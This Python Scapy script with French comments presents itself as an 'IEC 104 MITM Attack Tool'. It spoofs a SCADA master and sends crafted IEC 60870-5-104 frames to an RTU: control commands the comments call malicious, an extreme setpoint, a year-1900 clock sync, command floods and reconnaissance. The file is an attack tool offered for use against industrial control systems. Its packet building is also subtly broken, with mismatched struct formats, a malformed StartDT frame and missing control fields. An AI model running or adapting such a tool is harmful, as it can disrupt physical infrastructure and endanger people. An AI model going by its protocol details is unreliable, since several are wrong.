from scapy.all import *
import struct
import time

# Configuration réseau
ip_master = "192.168.1.100"  # HMI/SCADA
ip_rtu = "192.168.1.30"      # RTU (Remote Terminal Unit)
sport = 2404                 # Port IEC 104 standard
dport = 2404
seq_num = 100000
ack_num = 200000

# IEC 104 - StartDT Request (Connexion)
def create_startdt_request():
    # En-tête IEC 104
    start_byte = 0x68         # Start byte
    length = 0x04             # Length
    type_id = 0x07            # StartDT act
    sq_num = 0x0000           # Sequence number
    cot = 0x06                # Cause of transmission (activation)
    org = 0x00                # Originator address
    asdu_addr = 0x0001        # ASDU address
    io_addr = 0x0000          # IO address
    io_elements = 0x00        # IO elements
    
    payload = struct.pack(">BBBBHHBBHBB",
        start_byte,
        length,
        type_id,
        sq_num,
        cot,
        org,
        asdu_addr,
        io_addr,
        io_elements
    )
    
    return payload

# IEC 104 - Interrogation Command (Lecture)
def create_interrogation_command():
    start_byte = 0x68
    length = 0x0E
    type_id = 0x64            # C_IC_NA_1 (Interrogation command)
    sq_num = 0x0001
    cot = 0x06                # Activation
    org = 0x00
    asdu_addr = 0x0001
    io_addr = 0x0000
    io_elements = 0x01
    qualifier = 0x14          # Qualifier of interrogation (global)
    
    payload = struct.pack(">BBBBHHBBHBB",
        start_byte,
        length,
        type_id,
        sq_num,
        cot,
        org,
        asdu_addr,
        io_addr,
        io_elements,
        qualifier
    )
    
    return payload

# IEC 104 - Single Command (Télécommande)
def create_single_command():
    start_byte = 0x68
    length = 0x0E
    type_id = 0x2D            # C_SC_NA_1 (Single command)
    sq_num = 0x0002
    cot = 0x06                # Activation
    org = 0x00
    asdu_addr = 0x0001
    io_addr = 0x0001          # Adresse de l'objet de commande
    io_elements = 0x01
    sco = 0x01                # Single command object (ON)
    qu = 0x00                 # Qualifier
    
    payload = struct.pack(">BBBBHHBBHBBB",
        start_byte,
        length,
        type_id,
        sq_num,
        cot,
        org,
        asdu_addr,
        io_addr,
        io_elements,
        sco,
        qu
    )
    
    return payload

# IEC 104 - Double Command (Télécommande double)
def create_double_command():
    start_byte = 0x68
    length = 0x0E
    type_id = 0x2E            # C_DC_NA_1 (Double command)
    sq_num = 0x0003
    cot = 0x06                # Activation
    org = 0x00
    asdu_addr = 0x0001
    io_addr = 0x0002          # Adresse de l'objet de commande
    io_elements = 0x01
    dco = 0x02                # Double command object (SELECT)
    qu = 0x00                 # Qualifier
    
    payload = struct.pack(">BBBBHHBBHBBB",
        start_byte,
        length,
        type_id,
        sq_num,
        cot,
        org,
        asdu_addr,
        io_addr,
        io_elements,
        dco,
        qu
    )
    
    return payload

# IEC 104 - Set Point Command (Commande de consigne)
def create_setpoint_command():
    start_byte = 0x68
    length = 0x0F
    type_id = 0x30            # C_SE_NC_1 (Set point command, normalised)
    sq_num = 0x0004
    cot = 0x06                # Activation
    org = 0x00
    asdu_addr = 0x0001
    io_addr = 0x0003          # Adresse de l'objet de consigne
    io_elements = 0x01
    setpoint_value = struct.pack(">f", 999.99)  # Valeur malveillante
    qos = 0x00                # Quality of setpoint
    
    payload = struct.pack(">BBBBHHBBHB",
        start_byte,
        length,
        type_id,
        sq_num,
        cot,
        org,
        asdu_addr,
        io_addr,
        io_elements
    ) + setpoint_value + struct.pack(">B", qos)
    
    return payload

# IEC 104 - Clock Synchronization Command (Synchronisation horloge)
def create_clock_sync_command():
    start_byte = 0x68
    length = 0x0E
    type_id = 0x67            # C_CS_NA_1 (Clock synchronisation command)
    sq_num = 0x0005
    cot = 0x06                # Activation
    org = 0x00
    asdu_addr = 0x0001
    io_addr = 0x0000
    io_elements = 0x01
    # Timestamp malveillant (année 1900)
    cp56time2a = struct.pack(">BBBBBBH", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0000)
    
    payload = struct.pack(">BBBBHHBBHB",
        start_byte,
        length,
        type_id,
        sq_num,
        cot,
        org,
        asdu_addr,
        io_addr,
        io_elements
    ) + cp56time2a
    
    return payload

# IEC 104 - Test Command (Test de communication)
def create_test_command():
    start_byte = 0x68
    length = 0x0E
    type_id = 0x70            # C_TS_NA_1 (Test command)
    sq_num = 0x0006
    cot = 0x06                # Activation
    org = 0x00
    asdu_addr = 0x0001
    io_addr = 0x0000
    io_elements = 0x01
    test_value = 0xDEADBEEF   # Valeur de test malveillante
    
    payload = struct.pack(">BBBBHHBBHI",
        start_byte,
        length,
        type_id,
        sq_num,
        cot,
        org,
        asdu_addr,
        io_addr,
        io_elements,
        test_value
    )
    
    return payload

# Fonction d'attaque MITM
def iec104_mitm_attack():
    print("[+] Démarrage de l'attaque IEC 104 MITM...")
    
    # 1. Établissement de connexion
    print("[+] Phase 1: Établissement de connexion...")
    startdt_payload = create_startdt_request()
    ip = IP(src=ip_master, dst=ip_rtu)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    startdt_packet = ip / tcp / Raw(load=startdt_payload)
    send(startdt_packet, verbose=1)
    
    time.sleep(1)
    
    # 2. Interrogation générale (lecture de tous les points)
    print("[+] Phase 2: Interrogation générale...")
    interro_payload = create_interrogation_command()
    tcp.seq += len(startdt_payload)
    tcp.ack += 1
    interro_packet = ip / tcp / Raw(load=interro_payload)
    send(interro_packet, verbose=1)
    
    time.sleep(1)
    
    # 3. Commande simple malveillante
    print("[+] Phase 3: Injection de commande simple malveillante...")
    single_cmd_payload = create_single_command()
    tcp.seq += len(interro_payload)
    tcp.ack += 1
    single_cmd_packet = ip / tcp / Raw(load=single_cmd_payload)
    send(single_cmd_packet, verbose=1)
    
    time.sleep(1)
    
    # 4. Commande double malveillante
    print("[+] Phase 4: Injection de commande double malveillante...")
    double_cmd_payload = create_double_command()
    tcp.seq += len(single_cmd_payload)
    tcp.ack += 1
    double_cmd_packet = ip / tcp / Raw(load=double_cmd_payload)
    send(double_cmd_packet, verbose=1)
    
    time.sleep(1)
    
    # 5. Modification de consigne
    print("[+] Phase 5: Modification de consigne malveillante...")
    setpoint_payload = create_setpoint_command()
    tcp.seq += len(double_cmd_payload)
    tcp.ack += 1
    setpoint_packet = ip / tcp / Raw(load=setpoint_payload)
    send(setpoint_packet, verbose=1)
    
    time.sleep(1)
    
    # 6. Attaque de synchronisation horloge
    print("[+] Phase 6: Attaque de synchronisation horloge...")
    clock_payload = create_clock_sync_command()
    tcp.seq += len(setpoint_payload)
    tcp.ack += 1
    clock_packet = ip / tcp / Raw(load=clock_payload)
    send(clock_packet, verbose=1)
    
    print("[+] Attaque IEC 104 terminée!")

# Fonction d'attaque par flooding
def iec104_flooding_attack():
    print("[+] Attaque IEC 104 flooding...")
    
    # Envoi massif de commandes
    for i in range(100):
        single_cmd_payload = create_single_command()
        ip = IP(src=ip_master, dst=ip_rtu)
        tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num+i, ack=ack_num+i)
        packet = ip / tcp / Raw(load=single_cmd_payload)
        send(packet, verbose=0)
        time.sleep(0.01)
    
    print("[+] Attaque flooding terminée!")

# Fonction de reconnaissance
def iec104_reconnaissance():
    print("[+] Reconnaissance IEC 104...")
    
    # Tentative de connexion
    startdt_payload = create_startdt_request()
    
    ip = IP(src=ip_master, dst=ip_rtu)
    tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
    packet = ip / tcp / Raw(load=startdt_payload)
    
    send(packet, verbose=1)
    print("[+] Paquet de reconnaissance envoyé")

# Fonction d'attaque de test malveillant
def iec104_test_attack():
    print("[+] Attaque de test IEC 104...")
    
    # Envoi de commandes de test malveillantes
    for i in range(10):
        test_payload = create_test_command()
        ip = IP(src=ip_master, dst=ip_rtu)
        tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num+i, ack=ack_num+i)
        packet = ip / tcp / Raw(load=test_payload)
        send(packet, verbose=1)
        time.sleep(0.5)
    
    print("[+] Attaque de test terminée!")

if __name__ == "__main__":
    print("=== IEC 104 MITM Attack Tool ===")
    print("1. Reconnaissance")
    print("2. Attaque complète")
    print("3. Attaque flooding")
    print("4. Attaque de test")
    
    choice = input("Choix (1/2/3/4): ")
    
    if choice == "1":
        iec104_reconnaissance()
    elif choice == "2":
        iec104_mitm_attack()
    elif choice == "3":
        iec104_flooding_attack()
    elif choice == "4":
        iec104_test_attack()
    else:
        print("Choix invalide")
